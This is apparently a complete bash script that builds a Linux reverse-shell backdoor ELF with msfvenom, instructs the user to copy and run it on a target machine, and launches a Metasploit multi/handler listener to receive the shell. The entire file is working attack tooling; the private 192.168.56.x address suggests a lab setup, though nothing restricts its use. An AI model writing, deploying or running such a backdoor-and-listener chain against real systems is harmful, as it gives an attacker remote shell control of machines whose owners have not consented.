#!/bin/bash

# Configuration parameters (modify according to your environment)
LHOST="192.168.56.101"
LPORT="4444"
PAYLOAD="linux/x86/shell_reverse_tcp"
OUTFILE="backdoor.elf"

echo "[*] Testing internet connectivity (8.8.8.8)..."
ping -c 2 8.8.8.8 > /dev/null
if [ $? -ne 0 ]; then
  echo "[-] Cannot reach the internet ❌ — please check your network."
  exit 1
fi

echo "[*] Testing DNS resolution (google.com)..."
ping -c 2 google.com > /dev/null
if [ $? -ne 0 ]; then
  echo "[-] DNS appears to be misconfigured ❌ — please check /etc/resolv.conf."
  exit 1
fi

echo "[+] Network OK V"

echo "[*] Generating reverse shell payload: $OUTFILE"
msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -f elf -o $OUTFILE

if [ $? -ne 0 ]; then
  echo "[-] msfvenom failed X — please ensure Metasploit is installed correctly."
  exit 1
fi

chmod +x $OUTFILE
echo "[+] Payload saved as: $(pwd)/$OUTFILE"

echo
echo "Please transfer the file to the target machine and run:"
echo "    ./backdoor.elf"
echo

echo "[*] Starting Metasploit handler..."

# Auto-generate a Metasploit control script
MSF_SCRIPT="msf_handler.rc"
cat > $MSF_SCRIPT <<EOF
use exploit/multi/handler
set payload $PAYLOAD
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
exploit -j
EOF

msfconsole -r "$MSF_SCRIPT"
